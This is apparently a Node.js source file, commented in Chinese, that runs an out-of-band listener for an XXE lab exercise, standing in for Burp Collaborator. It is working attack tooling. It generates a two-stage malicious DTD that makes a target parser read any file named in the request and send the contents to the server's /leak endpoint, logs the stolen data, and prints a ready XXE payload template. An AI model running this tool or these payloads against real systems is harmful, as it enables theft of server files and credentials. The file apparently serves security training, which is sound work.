#!/usr/bin/env node
// ============================================================
// oob_server.js —— xxe2 配套的 OOB（带外）监听平台【本地模拟】
// 真实世界里这一角色由 Burp Collaborator / requestbin / 自建 VPS 扮演。
// 零依赖，Node 18+ 原生运行：node oob_server.js [port]   默认 8307
//
// 路由：
//   GET /                     控制台首页（用法 + 实时日志，2s 自动刷新）
//   GET /evil.dtd?cb=<回调基址>&f=<要读的文件URL>&t=<标记>
//                             动态生成第二级 DTD（读 f 并把内容发到 cb/leak?d=…）
//   GET /leak?d=<数据>&t=…    回调落库（这是靶机"喊"出来的数据）
//   GET /api/log              日志 JSON（供首页轮询；CORS: *，便于跨端口页面调试）
//   GET /clear                清空日志
// ============================================================
const http = require('http');
const PORT = parseInt(process.argv[2] || process.env.PORT || '8307', 10);

const logs = []; // {time, ip, path, data, tag}

function now() { return new Date().toISOString().replace('T', ' ').slice(0, 19); }
function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }

const server = http.createServer((req, res) => {
  const u = new URL(req.url, `http://127.0.0.1:${PORT}`);
  const p = u.pathname;

  if (p === '/evil.dtd') {
    // cb 未指定时默认用请求方 Host（本地测试即 127.0.0.1:PORT）
    const host = req.headers.host || `127.0.0.1:${PORT}`;
    const cb = u.searchParams.get('cb') || `http://${host}`;
    const f  = u.searchParams.get('f') || 'file:///flag_xxe2.txt';
    const t  = u.searchParams.get('t') || 'main';
    const cbBase = cb.replace(/\/+$/, '');
    const dtd =
`<!ENTITY % file SYSTEM "${f}">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM '${cbBase}/leak?d=%file;'>">
%int;
%send;
`;
    logs.push({ time: now(), ip: req.socket.remoteAddress, path: '/evil.dtd', data: `[payload] 读取 ${f} → 回调 ${cbBase}`, tag: t });
    res.writeHead(200, { 'Content-Type': 'application/xml-dtd; charset=utf-8' });
    return res.end(dtd);
  }

  if (p === '/leak') {
    const d = u.searchParams.get('d') || '';
    const t = u.searchParams.get('t') || '';
    logs.push({ time: now(), ip: req.socket.remoteAddress, path: '/leak', data: d, tag: t });
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    return res.end('got it\n');
  }

  if (p === '/api/log') {
    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8', 'Access-Control-Allow-Origin': '*' });
    return res.end(JSON.stringify(logs.slice(-100)));
  }

  if (p === '/clear') {
    logs.length = 0;
    res.writeHead(302, { Location: '/' });
    return res.end();
  }

  if (p === '/') {
    const host = req.headers.host || `127.0.0.1:${PORT}`;
    const rows = logs.slice().reverse().map(l =>
      `<tr><td>${esc(l.time)}</td><td>${esc(l.ip)}</td><td>${esc(l.path)}</td><td><code>${esc(l.data)}</code></td></tr>`).join('\n');
    const html = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8">
<title>OOB 监听平台（模拟 Collaborator）</title>
<meta http-equiv="refresh" content="3">
<style>
body{margin:0;font-family:"Segoe UI",system-ui,sans-serif;background:#0a0f1e;color:#e2e8f0;line-height:1.75;padding:28px 16px}
.w{max-width:980px;margin:0 auto}h1{font-size:22px;color:#38bdf8}
.box{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:16px 20px;margin:14px 0}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
table{border-collapse:collapse;width:100%;font-size:13px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}
th{color:#38bdf8}.tag{color:#fbbf24}a{color:#38bdf8}
</style></head><body><div class="w">
<h1>🛰️ OOB 监听平台 <span class="tag">（本地模拟 · Burp Collaborator 的替身）</span></h1>
<div class="box"><b>本平台地址</b>：<code>http://${esc(host)}/</code>
<br><b>用法</b>：让靶机请求 <code>/evil.dtd?cb=http://${esc(host)}&amp;f=file:///&lt;要读的文件&gt;</code>，
平台会动态生成两级实体 DTD——靶机解析时会读取 <code>f</code> 指向的文件，并把内容作为 <code>d=</code> 参数回调到 <code>/leak</code>（下方日志实时展示，3 秒自动刷新）。
<br>一级 payload 模板（提交给靶机）：
<pre>&lt;!DOCTYPE batch [
  &lt;!ENTITY % remote SYSTEM "http://${esc(host)}/evil.dtd?cb=http://${esc(host)}&amp;f=file:///&lt;目标文件&gt;"&gt;
  %remote;
]&gt;
&lt;batch&gt;&lt;item&gt;x&lt;/item&gt;&lt;/batch&gt;</pre>
<a href="/clear">清空日志</a></div>
<div class="box"><b>📡 泄露日志（${logs.length} 条）</b>
<table><tr><th>时间</th><th>来源 IP</th><th>入口</th><th>数据</th></tr>
${rows || '<tr><td colspan="4" style="color:#94a3b8">（空：等靶机把数据"喊"过来）</td></tr>'}
</table></div>
</div></body></html>`;
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(html);
  }

  res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end('not found\n');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[oob_server] listening on http://0.0.0.0:${PORT}/  (console)  /evil.dtd  /leak`);
});
